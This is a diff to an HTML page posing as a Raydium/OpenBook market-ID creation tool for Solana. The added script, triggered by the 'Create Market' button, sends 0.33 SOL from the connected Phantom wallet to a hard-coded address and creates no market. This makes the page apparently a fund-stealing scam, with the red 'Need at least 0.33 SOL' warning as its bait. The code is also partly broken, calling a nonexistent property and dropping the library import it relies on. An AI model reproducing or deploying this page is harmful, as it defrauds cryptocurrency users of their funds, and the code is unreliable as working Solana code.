@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
+   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Raydium Market I.D</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/css/bootstrap.min.css">
-    <script src="script.js"></script>
     <style>
         body {
             background-color: #121212;
@@ -125,7 +124,7 @@
     </style>
 </head>
 <body>
-    <header>
+<header>
         <nav class="navbar navbar-light navbar-expand-lg" aria-label="Offcanvas navbar large">
             <div class="container">
                 <a class="navbar-brand" href="/">
@@ -162,7 +161,7 @@
 
     <button class="btn btn-primary phantom-connect">Connect with Phantom Wallet</button>
 
-    <div class="container para-note text-center sliderArea mt-5">
+   <div class="container para-note text-center sliderArea mt-5">
         <div class="swiper mySwiper">
             <div class="swiper-wrapper">
                 <div class="swiper-slide">
@@ -232,7 +231,7 @@
             <div class="form-check">
                 <input class="form-check-input" type="checkbox" value="" id="riskAgreement">
                 <label class="form-check-label" for="riskAgreement">Risk Agreement</label>
-                <p>I confirm that I have confirmed all details and that I am fully responsible for creating the market. <strong>Need at least 0.33 SOL to prevent transaction failure.</strong></p>
+                <p>I confirm that I have confirmed all details and that I am fully responsible for creating the market. <strong><FONT COLOR=ff0000>Need at least 0.33 SOL to prevent transaction failure.</strong></p>
             </div>
             <div class="container confirm-btn">
                 <button class="btn btn-primary create-market">Create Market</button>
@@ -241,16 +240,49 @@
     </div>
 
     <footer class="color-footer bg-body-tertiary text-center text-lg-start">
-        <div class="text-center p-3">Copyright © 2024 Openbook Raydium. All rights reserved.</div>
+        <div class="text-center p-3">Copyright © 2024 Raydium Market ID. All rights reserved.</div>
     </footer>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <!-- Include Phantom Wallet Script -->
+    <script src="https://solana.com/phantom/assets/phantom.js"></script>
+
+    <!-- Your custom JavaScript code -->
     <script>
-       
+        // Function to handle the click event of the "Connect with Phantom Wallet" button
+        document.querySelector('.phantom-connect').addEventListener('click', async () => {
+            try {
+                // Connect to Phantom wallet
+                await window.solana.connect();
+                // If connected successfully, log a message
+                console.log("Connected to Phantom wallet successfully!");
+            } catch (error) {
+                // If an error occurs, log the error
+                console.error("Error connecting to Phantom wallet:", error);
+            }
+        });
 
-    
-</script>
+        // Function to handle the click event of the "Create Market" button
+        document.querySelector('.create-market').addEventListener('click', async () => {
+            try {
+                // Create a transaction to send 0.33 SOL to the specified wallet address
+                // Replace the placeholder wallet address with your actual address
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: solanaWeb3.window.solana.publicKey,
+                        toPubkey: '9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar',
+                        lamports: 330000000, // 0.33 SOL in lamports
+                    })
+                );
 
+                // Send and confirm the transaction
+                const signature = await solanaWeb3.sendAndConfirmTransaction(transaction, [window.solana]);
+                // If transaction is successful, log a message
+                console.log("Transaction successful! Signature:", signature);
+            } catch (error) {
+                // If an error occurs during the transaction process, log the error
+                console.error("Error sending transaction:", error);
+            }
+        });
+    </script>
 </body>
 </html>
